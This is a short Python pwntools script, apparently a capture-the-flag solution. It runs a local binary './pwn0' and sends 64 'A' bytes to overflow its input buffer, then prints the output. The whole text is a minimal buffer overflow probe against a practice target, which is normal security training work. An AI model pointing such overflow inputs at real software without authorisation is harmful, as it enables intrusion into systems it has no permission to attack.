from pwn import *

p = process("./pwn0");

size = 64;

garbage = b"A" * size;

p.recvuntil("\n");
p.sendline(garbage);

msg = p.recvall();

print(msg);
